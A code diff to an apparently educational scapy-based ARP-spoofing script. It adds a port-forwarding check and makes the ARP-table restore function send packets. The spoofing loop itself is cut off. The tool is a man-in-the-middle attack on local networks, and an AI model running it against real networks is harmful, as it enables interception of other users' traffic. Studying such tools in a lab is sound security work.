@@ -1,14 +1,12 @@
 #/usr/bin/env python
 import time
 import sys
-from scapy.layers.l2 import ARP, Ether
-from utils.scapy_utils import spoof, get_mac
+from scapy.layers.l2 import ARP
+from scapy.all import send
+from utils.scapy_utils import spoof, get_mac, check_port_forwarding
 
-# TO_DOS:
-# 1.  Check port forwarding is enabled, and if no quit and give a warning.
-# In Linux, the command is: echo 1 | sudo tee  /proc/sys/net/ipv4/ip_forward.
+check_port_forwarding()
 
-# 2. When we quit, restore the ARP tables in the router and the target.
 def restore(destination_ip, source_ip, get_mac_address): # Gonna call this with import get_mac
     target_mac = get_mac_address(destination_ip) # Using get_mac from above here
     source_mac = get_mac_address(source_ip)
@@ -18,10 +16,9 @@ def restore(destination_ip, source_ip, get_mac_address): # Gonna call this with 
     # psrc: IP Source.
     # hwsrc: MAC Address Source.  Essential otherwise Kali will still set the source MAC as my MAC.
     packet = ARP(op=2, pdst=destination_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
-    print(packet.show())
-    print(packet.summary())
+    send(packet, verbose=False)
 # Destination IP is the IP for the Client (target). Source IP = Router (gateway)
-restore("192.168.63.174", "192.168.63.2", get_mac)
+# restore("192.168.63.174", "192.168.63.2", get_mac)
 
 sent_packets_count = 0
 try:
